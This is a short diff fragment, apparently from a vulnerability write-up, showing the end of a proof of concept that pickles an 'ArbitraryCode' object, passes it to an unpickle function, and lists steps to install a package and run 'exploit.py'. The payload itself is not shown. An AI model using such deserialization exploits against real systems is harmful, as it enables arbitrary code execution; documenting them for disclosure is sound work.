@@ -19,5 +19,5 @@ class ArbitraryCode:
 dumps = pickle.dumps(ArbitraryCode())
 utils.unpickle(dumps)
 ```
-* `pip3 install apache-flink`
+* `pip3 install psq`
 * `python3 exploit.py`
